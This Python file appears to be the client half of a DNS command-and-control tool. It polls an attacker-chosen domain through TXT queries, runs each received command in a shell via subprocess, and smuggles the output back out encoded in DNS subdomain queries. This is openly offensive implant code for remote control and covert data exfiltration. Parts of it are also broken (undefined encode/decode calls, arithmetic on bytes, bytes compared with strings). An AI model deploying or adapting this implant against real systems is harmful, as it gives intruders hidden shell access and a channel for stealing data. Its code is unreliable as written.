#!/usr/bin/env/python3
# from https://github.com/chriselgee/ObviousDNSC2

import dns.resolver
import argparse
import base64
import datetime
from time import sleep
from textwrap import wrap
import subprocess

# colorize output
OV = '\x1b[0;33m' # verbose
OR = '\x1b[0;34m' # routine
OE = '\x1b[1;31m' # error
OM = '\x1b[0m'    # mischief managed

maxAReq = 63
maxResp = 253

def toBytes(input):
    if isinstance(input, str): return input.encode('utf8')
    else: return input
def toString(input):
    if isinstance(input, bytes): return input.decode('utf8')
    else: return input

def decode64(b64):
    return base64.b64decode(toBytes(b64))
def encode64(plain):
    return base64.b64encode(toBytes(plain))
def decode32(b32):
    revert = toBytes(b32).replace(b"-",b"=") # undo the "equals" silliness
    if revert.endswith(b"0"): revert = revert[:-1] # pop off any extra pad
    return base64.b32decode(revert)
def encode32(plain):
    switch = toBytes(plain)
    return base64.b32encode(switch).replace(b"=",b"-") # "equals" isn't allowed to play in domain names

class job:
    def __init__(self, id, domain, command, start):
        self.id = id
        self.domain = domain
        self.command = command
        self.start = datetime.datetime.now()
    # perform command
    # send output back in X batches
    # limit queries to 253 chars - incl domain

def main():
    parser = argparse.ArgumentParser(description='Connect to an Obvious DNS C2 server.')
    parser.add_argument('domain', help="DNS name to send traffic to. You must have an NS record pointing to the host running the ODC2 Server.")
    parser.add_argument("-v", "--verbose", action="store_true", help="Increase output verbosity")
    parser.add_argument('-d','--delay', default=5, type=int, help='Number of seconds to wait between beacons to C2.')
    parser.add_argument('-t','--timeout', default=3, type=float, help='Timeout in ms to C2.')
    args = parser.parse_args()
    debuggin = args.verbose
    if debuggin:
        print(f"{OV}* Verbose output enabled{OM}")
        print(f"{OV}* Delay between beacons set to {OR}{args.delay}{OM}")
    if not args.domain.startswith("."):
        args.domain = "." + args.domain # because we don't want CHKWEQGF--odc2.example.com
    print(f"{OR}Connecting to {OV}{args.domain}{OM}")
    try:
        res = dns.resolver.Resolver()
        res.timeout = args.timeout
        running = True
        while running:
            sleep(args.timeout)
            subd = encode32("CHK" + str(datetime.datetime.now())) # check in for commands
            if subd.endswith(b"-"): subd += b"0" # can't end a subdomain with "-"
            answer = res.query(subd.decode('UTF8') + args.domain, "TXT")
            answer = decode64(answer[0].to_text())[:3]
            msgType = answer[:3]
            if msgType == "NUL": # nop if nothing from server
                if debuggin: print(f"{OV}NUL from server{OM}")
            elif msgType == "DIE": # stop if told so
                print(f"{OR}DIE message received; I'm out{OM}")
                running = False
            elif msgType == "HDR": # command header; process
                if debuggin: print(f"{OV}HDR from server{OM}")
                cmdPktCt = int(answer[3:]) # how many lines long is the command?
                command = ""
                for i in range(cmdPktCt): # get all lines
                    subd = encode32("CON" + str(datetime.datetime.now()))
                    answer = res.query(subd + args.domain, "TXT")
                    answer = decode64(answer[0].to_text())[:3]
                    msgType = answer[:3]
                    command += answer[3:]
                # output = subprocess.check_output("cat /etc/services", shell=True)
                output = subprocess.check_output(command, shell=True)
                codedOutput = encode32(output)
                respPktCt = int(codedOutput / 57) + 1 # number of packets to send response
                subd = encode("HDR" + str(respPktCt) + " " + str(datetime.datetime.now())) # tell how many packets of response are coming
                answer = res.query(subd + args.domain, "TXT")
                answer = decode(answer[0].to_text())[:3]
                msgType = answer[:3]
                chunks = wrap(output,57)
                if msgType != "ACK":
                    error = f"Expected 'ACK' from server, got {msgType}"
                    print(OE + error + OM)
                    raise Exception(error)
                for chunk in chunks:
                    # subd = encode32("RES" + hex(i)[-2:] + chunk)
                    subd = encode32("RES" + chunk)
                    if subd.endswith(b"-"): subd += b"0" # can't start/end subdomain with "-"
                    if subd.startswith(b"-"): subd = b"0" + subd
                    answer = res.query(subd + args.domain, "TXT")
                    # if decode64(answer[0].to_text())[:5] != "ACK" + hex(i)[-2:]:
                    if decode64(answer[0].to_text())[:3] != "ACK":
                        error = f"Expected 'ACK' from server, got {decode64(answer[0].to_text())[:5]}"
                        print(OE + error + OM)
                        raise Exception(error)
    except KeyboardInterrupt:
        pass
    finally:
        pass
    
    # answers = dns.resolver.query('dnspython.org', 'MX')
    # for rdata in answers:
    #     print('Host', rdata.exchange, 'has preference', rdata.preference)

main()